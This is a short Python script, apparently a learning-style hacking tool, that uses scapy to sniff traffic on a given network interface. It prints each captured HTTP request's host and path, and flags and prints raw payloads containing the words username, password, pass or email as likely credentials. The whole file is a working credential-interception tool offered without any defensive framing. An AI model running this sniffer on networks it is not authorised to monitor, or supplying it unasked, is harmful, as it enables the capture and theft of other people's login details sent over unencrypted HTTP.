#!/usr/bin/env python
import scapy.all as scapy
import argparse
from scapy.layers import http
import colorama # color application for visual
from colorama import Fore

def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets")
    arguments = parser.parse_args()
    return arguments.interface

def sniff(iface):
    # store = false to not buffer sniffed packets
    # prn gives callback when packet is captured
    scapy.sniff(iface=iface, store=False, prn=process_packet)

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # Host and Path field together forms URL
        print("[+] Http Request >> " + (packet[http.HTTPRequest].Host).decode('utf-8') + (packet[http.HTTPRequest].Path).decode('utf-8'))
        # if packet has Raw layer for sending username/password
        if packet.haslayer(scapy.Raw): 
            load = packet[scapy.Raw].load
            keys = (["username".encode('utf-8'), "password".encode('utf-8'), "pass".encode('utf-8'), "email".encode('utf-8')])
            for key in keys:
                if key in load:
                    print(Fore.GREEN + "\n\n\n[+] Possible password/username >> " + load.decode('utf-8') + "\n\n\n")
                    break

iface = get_interface()
sniff(iface)
